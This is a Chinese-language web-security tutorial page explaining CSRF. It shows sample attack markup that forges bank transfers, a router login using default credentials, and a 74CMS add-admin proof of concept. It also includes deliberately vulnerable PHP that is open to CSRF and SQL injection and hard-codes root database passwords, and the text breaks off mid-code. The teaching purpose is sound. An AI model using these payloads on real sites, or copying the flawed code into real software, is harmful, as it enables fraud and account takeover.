<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Web安全|CSRF | 他年少如歌</title><meta name="description" content="CSRF基础介绍CSRF漏洞​    CSRF（Cross-site request forgery，跨站请求伪造）也被成为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，尽管听起来像XSS，但是它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与XSS攻击相比，CSRF攻击往"><meta name="keywords" content="网络安全"><meta name="author" content="他年少如歌"><meta name="copyright" content="他年少如歌"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://chakalake.gitee.io/posts/387/"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><meta property="og:type" content="article"><meta property="og:title" content="Web安全|CSRF"><meta property="og:url" content="https://chakalake.gitee.io/posts/387/"><meta property="og:site_name" content="他年少如歌"><meta property="og:description" content="CSRF基础介绍CSRF漏洞​    CSRF（Cross-site request forgery，跨站请求伪造）也被成为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，尽管听起来像XSS，但是它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与XSS攻击相比，CSRF攻击往"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/035.webp"><meta property="article:published_time" content="2019-11-28T23:06:45.000Z"><meta property="article:modified_time" content="2021-03-20T11:41:49.898Z"><meta name="twitter:card" content="summary"><script>var activateDarkMode = function () {
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#000')
  }
}
var activateLightMode = function () {
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null) {
    document.querySelector('meta[name="theme-color"]').setAttribute('content', '#fff')
  }
}

var getCookies = function (name) {
  const value = `; ${document.cookie}`
  const parts = value.split(`; ${name}=`)
  if (parts.length === 2) return parts.pop().split(';').shift()
}

var autoChangeMode = 'false'
var t = getCookies('theme')
if (autoChangeMode === '1') {
  var isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
  var isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
  var isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
  var hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

  if (t === undefined) {
    if (isLightMode) activateLightMode()
    else if (isDarkMode) activateDarkMode()
    else if (isNotSpecified || hasNoSupport) {
      console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
      var now = new Date()
      var hour = now.getHours()
      var isNight = hour <= 6 || hour >= 18
      isNight ? activateDarkMode() : activateLightMode()
    }
    window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
      if (Cookies.get('theme') === undefined) {
        e.matches ? activateDarkMode() : activateLightMode()
      }
    })
  } else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else if (autoChangeMode === '2') {
  now = new Date()
  hour = now.getHours()
  isNight = hour <= 6 || hour >= 18
  if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode()
} else {
  if (t === 'dark') activateDarkMode()
  else if (t === 'light') activateLightMode()
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="prev" title="Web安全|SSRF" href="https://chakalake.gitee.io/posts/49543/"><link rel="next" title="靶机练习|XSS之旅" href="https://chakalake.gitee.io/posts/19064/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: false,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: true,
  fancybox: true,
  Snackbar: {"bookmark":{"message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  baiduPush: true,
  highlightCopy: true,
  highlightLang: true,
  isPhotoFigcaption: false,
  islazyload: true,
  isanchor: false    
}</script><script>var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isSidebar: true,
  postUpdate: '2021-03-20 19:41:49'
}</script><noscript><style>
#nav {
  opacity: 1
}
.justified-gallery img{
  opacity: 1
}
</style></noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@master/Hexo/css/flink.min.css"></head><body><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/Chocolate1999/cdn/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">40</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">3</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">14</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div></div></div><i class="fas fa-arrow-right on" id="toggle-sidebar"></i><div id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF基础"><span class="toc-number">1.</span> <span class="toc-text">CSRF基础</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#介绍CSRF漏洞"><span class="toc-number">1.1.</span> <span class="toc-text">介绍CSRF漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF漏洞原理"><span class="toc-number">1.2.</span> <span class="toc-text">CSRF漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#几种常见的攻击类型"><span class="toc-number">1.3.</span> <span class="toc-text">几种常见的攻击类型</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF利用及代码分析"><span class="toc-number">2.</span> <span class="toc-text">CSRF利用及代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF攻击"><span class="toc-number">2.1.</span> <span class="toc-text">CSRF攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF漏洞代码"><span class="toc-number">2.2.</span> <span class="toc-text">CSRF漏洞代码</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF防御"><span class="toc-number">3.</span> <span class="toc-text">CSRF防御</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#验证HTTP-Referer字段"><span class="toc-number">3.1.</span> <span class="toc-text">验证HTTP Referer字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#验证token字段"><span class="toc-number">3.2.</span> <span class="toc-text">验证token字段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP头中自定义属性并验证"><span class="toc-number">3.3.</span> <span class="toc-text">HTTP头中自定义属性并验证</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Chrome浏览器启用Samesite-cookie"><span class="toc-number">3.4.</span> <span class="toc-text">Chrome浏览器启用Samesite cookie</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他策略"><span class="toc-number">3.5.</span> <span class="toc-text">其他策略</span></a></li></ol></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="photo"></div><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/HCLonely/hclonely.github.io/img/Butterfly/035.webp)"><nav id="nav"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">他年少如歌</a></span><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fas fa-list"></i><span> 媒体</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/bangumis/"><i class="fa-fw fab fa-youtube"></i><span> 番剧</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 电影</span></a></li><li><a class="site-page" href="/books/"><i class="fa-fw fas fa-book"></i><span> 书单</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/box/"><i class="fa-fw fab fa-xbox"></i><span> 聚宝盒</span></a></div><div class="menus_item"><a class="site-page" href="/talk/"><i class="fa-fw far fa-comment"></i><span> 微语</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-heartbeat"></i><span> 清单</span><i class="fas fa-chevron-down menus-expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw far fa-image"></i><span> 相册</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/contact/"><i class="fa-fw far fa-comments"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div></div><span class="toggle-menu close"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><div id="post-title"><div class="posttitle">Web安全|CSRF</div></div><div id="post-meta"><div class="meta-firstline"><time class="post-meta__date"><span class="post-meta__date-created" title="发表于 2019-11-29 07:06:45"><i class="far fa-calendar-alt fa-fw"></i> 发表于 2019-11-29</span><span class="post-meta__separator">|</span><span class="post-meta__date-updated" title="更新于 2021-03-20 19:41:49"><i class="fas fa-history fa-fw"></i> 更新于 2021-03-20</span></time><span class="post-meta__categories"><span class="post-meta__separator">|</span><i class="fas fa-inbox fa-fw post-meta__icon"></i><a class="post-meta__categories" href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></span></div><div class="meta-secondline"> </div><div class="meta-thirdline"><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta__icon"></i><span>阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout_post" id="content-inner"><article id="post"><div class="post-content" id="article-container"><h1 id="CSRF基础"><a href="#CSRF基础" class="headerlink" title="CSRF基础"></a>CSRF基础</h1><h2 id="介绍CSRF漏洞"><a href="#介绍CSRF漏洞" class="headerlink" title="介绍CSRF漏洞"></a>介绍CSRF漏洞</h2><p>​    CSRF（Cross-site request forgery，跨站请求伪造）也被成为One Click Attack或者Session Riding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用，尽管听起来像XSS，但是它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更危险性。<br>​    对比XSS：XSS利用的是用户对指定网站的信任，CSRF利用的是网站对用户网页浏览器的信任。</p>
<h2 id="CSRF漏洞原理"><a href="#CSRF漏洞原理" class="headerlink" title="CSRF漏洞原理"></a>CSRF漏洞原理</h2><p><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/112901.jpg" alt=""><br>    从上图可以看出，要完成一次CSRF攻击，受害者必须一次完成两个步骤。<br>★登录受信任网站A，并在本地生成cookie<br>★在不登出A的情况下，访问危险网站B<br>    CSRF攻击时源于web的隐式身份验证机制，web身份验证机制虽然可以保证一个请求时来自于某个用户的浏览器，但却无法保证请求是用户批准发送的。<br>    其实可以这样理解CSRF，攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账户，甚至购买商品、虚拟货币转账，这回泄露个人信息并威胁到目标用户的财产安全。<br>    示例1：<br>银行网站A，它以GET请求来完成银行转账的操作，如：<a href="http://www/mybank.com/Transfer.php?toBankid=11&amp;money=1000。" target="_blank" rel="noopener">http://www/mybank.com/Transfer.php?toBankid=11&amp;money=1000。</a><br>危险网站B，它里面有段HTML的代码；<br><code>&lt;img src=http://www.mybank.com/Transfer.php?toBankid=11&amp;money=1000&gt;</code><br>首先，你登了银行网站A，然后访问危险网站B，这时银行账号会少1000块。<br>原因是银行网站A违反了HTTP规范，使用了GET请求更新资源。在访问危险网站B之前，已经登录了危险网站A，而B中的<img>以GET方式请求第三方资源（这里的第三方就是指银行网站了，原本这是一个合法的请求，但这里被不法分子利用了），所以浏览器会带上银行网站A的cookie发出GET请求，结果银行服务器收到请求后，认为这是一个转账操作，所以就立刻进行转账操作。<br>    示例2：<br>为了杜绝上面的问题，银行决定改用POST请求完成转账操作。<br>银行网站A的WEB表单如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"Transfer.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>ToBankId:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"toBankid"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">P</span>&gt;</span>Moeny:<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"money"</span> /&gt;</span><span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">P</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Transfer"</span>&gt;</span><span class="tag">&lt;/<span class="name">P</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>后面处理页面Transfer.php页面如下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();				     <span class="keyword">if</span>(<span class="keyword">isset</span>($_REQUEST[<span class="string">'toBankid'</span>])&amp;&amp;<span class="keyword">isset</span>($_REQUEST[<span class="string">'money'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">  buy_stocks($_REQUEST[<span class="string">'toBankid'</span>],$_REQUEST[<span class="string">'money'</span>]); </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>危险网站B，仍然只是包含那句HTML代码。<br>结果和示例1一样，这次事故的原因是：银行后台使用了$_REQUEST去获取请求的 数据，而$_REQUEST既可以获取GET请求的数据，也可以获取POST请求的数据，这就造成了在后台处理程序无法区分这到底是GET请求的数据还是POST请求的数据。在PHP中，可以使用$_GET和$_POST分别获取GET请求和POST请求的数据。在JAVA中，用于获取请求数据request一样存在不能区分GET请求数据和POST数据的问题。<br>    示例3：<br>改用$_POST，只获取POST请求的数据，后台处理页面Tranfer.php代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_POST[&#39;toBankid&#39;])&amp;&amp;isset($_POST[&#39;money&#39;]))</span><br><span class="line">&#123;</span><br><span class="line">  buy_stocks($_POST[&#39;toBankid&#39;],$_POST[&#39;money&#39;]); </span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>然而危险网站B与时俱进，也改进了代码：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="actionscript">        	<span class="function"><span class="keyword">function</span> <span class="title">steal</span><span class="params">()</span></span></span></span><br><span class="line">            &#123;</span><br><span class="line"><span class="javascript">                iframe=<span class="built_in">document</span>.frames[<span class="string">"steal"</span>];</span></span><br><span class="line"><span class="actionscript">                iframe.document.Submit(<span class="string">"transfer"</span>);</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"steal()"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"steal"</span> <span class="attr">display</span>=<span class="string">"none"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">name</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://www.myBank.com/Transfer.php"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankid"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"toBankid"</span> <span class="attr">value</span>=<span class="string">"11"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="几种常见的攻击类型"><a href="#几种常见的攻击类型" class="headerlink" title="几种常见的攻击类型"></a>几种常见的攻击类型</h2><p>1、GET类型的CSRF<br>    这种类型的CSRF一般是由于程序员安全意识不强造成的。GET类型的CSRF利用非常简单，只需要一个HTTP请求，所以一般会这样利用：<br><code>&lt;img src=http://wooyun.org/csrf.php?xx=1 /&gt;</code><br>在访问含有这个img的页面后，成功向<a href="http://wooyun.org/csrf.php?xx=1发出了一次HTTP请求，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。" target="_blank" rel="noopener">http://wooyun.org/csrf.php?xx=1发出了一次HTTP请求，如果将该网址替换为存在GET型CSRF的地址，就能完成攻击了。</a><br>2、POST类型的CSRF<br>    这种类型的CSRF危害没有GET型的大，利用起来通常使用的是一个自动提交的表单，如：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">http://wooyun.org/csrf.php</span> <span class="attr">method</span>=<span class="string">POST</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"xx"</span> <span class="attr">value</span>=<span class="string">"11"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问该页面后，表单会自动提交，相当于模拟用户完成了一次POST操作。<br>3、其他猥琐流CSRF<br>    过基础认证的CSRF（常用于路由器）：<br><code>&lt;img src=http://admin:admin@192.168.1.1 /&gt;</code><br>加载该图片后，路由器会给用户一个合法的SESSION，就可以进行下一步的操作了。</p>
<h1 id="CSRF利用及代码分析"><a href="#CSRF利用及代码分析" class="headerlink" title="CSRF利用及代码分析"></a>CSRF利用及代码分析</h1><h2 id="CSRF攻击"><a href="#CSRF攻击" class="headerlink" title="CSRF攻击"></a>CSRF攻击</h2><p>74CMS后台添加管理员时存在CSRF漏洞，管理会员登录后，进入到【系统】-【网络管理员】-【添加管理员】中，进行添加管理<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/113001.png" alt=""><br>进行抓包：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/113002.png" alt=""><br>利用burp生成csrf POC：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/113003.png" alt=""><br>我们将页面内容拷贝到1.html文件中：<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/113004.png" alt=""><br>点击submit request；<br><img src= "/img/loading.gif" data-src="https://raw.githubusercontent.com/ChakaLake/ywd/master/img/113005.png" alt=""><br>我们发现test管理员已经添加成功。</p>
<h2 id="CSRF漏洞代码"><a href="#CSRF漏洞代码" class="headerlink" title="CSRF漏洞代码"></a>CSRF漏洞代码</h2><p>下面的代码时后台添加用户的代码。<br>​获取GET参数username和参数password，然后通过select语句查询是否存在对应的用户，如果用户存在，会通过$_SESSION设置一个session:isadmin=admin，否则设置session:isadmin=guest。<br>​接下来判断session中的isadmin是否为admin，如果isadmin!=admin，说明用户没有登录，那么跳转到登录页面。所以只有在管理员登录后才能执行添加用户的操作。<br>​获取POST参数uername和参数password，然后插入user表中，完成添加用户的操作。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	session_start();</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'login'</span>]))&#123;</span><br><span class="line">		$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>,<span class="string">"test"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line">		&#125;</span><br><span class="line">		$username = addslashes($_GET[<span class="string">'username'</span>]);</span><br><span class="line">		$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line">		$result = mysqli_query($con,<span class="string">"select * from users where `username`='"</span>.$username.<span class="string">"' and `password`='"</span>.$password.<span class="string">"'"</span>);</span><br><span class="line">		$row = mysqli_fetch_array($result);</span><br><span class="line">		<span class="keyword">if</span> ($row) &#123;</span><br><span class="line">			$_SESSION[<span class="string">'isadmin'</span>] = <span class="string">'admin'</span>;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"登录成功"</span>);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">			$_SESSION[<span class="string">'isadmin'</span>] = <span class="string">'guest'</span>;</span><br><span class="line">			<span class="keyword">exit</span>(<span class="string">"登录失败"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$_SESSION[<span class="string">'isadmin'</span>] = <span class="string">'guest'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ($_SESSION[<span class="string">'isadmin'</span>] != <span class="string">'admin'</span>)&#123;</span><br><span class="line">		<span class="keyword">exit</span>(<span class="string">"请登录后台"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">		$con=mysqli_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"123456"</span>,<span class="string">"test"</span>);</span><br><span class="line">		<span class="keyword">if</span> (mysqli_connect_errno())</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"连接失败: "</span> . mysqli_connect_error();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'username'</span>])) &#123;</span><br><span class="line">			$result1 = mysqli_query($con,<span class="string">"insert into users(`username`, `password`) VALUES ('"</span>.$_POST[<span class="string">'username'</span>].<span 